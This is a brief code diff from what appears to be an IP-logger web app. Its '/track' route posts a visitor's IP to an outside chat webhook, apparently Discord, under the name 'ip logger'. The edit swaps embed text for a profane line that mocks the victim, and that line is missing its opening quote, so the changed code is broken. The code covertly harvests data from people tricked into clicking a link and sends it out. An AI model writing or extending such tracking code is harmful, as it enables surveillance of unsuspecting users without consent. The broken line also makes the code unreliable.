@@ -138,10 +138,10 @@ app.get("/track", (req, res) => {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
-              username: "ip logger 💀",
+              username: "ip logger",
               avatar_url: "https://media1.tenor.com/m/nPd-ijwBSKQAAAAd/hacker-pc.gif",
               embeds: [{
-                title: "bro just clicked it they so cooked 🔥",
+                title: this bitch js clicked it lol lets see his fuckass data",
                 color: 0x5865F2,
                 fields: [
                   { name: "IP", value: data.ip, inline: true },
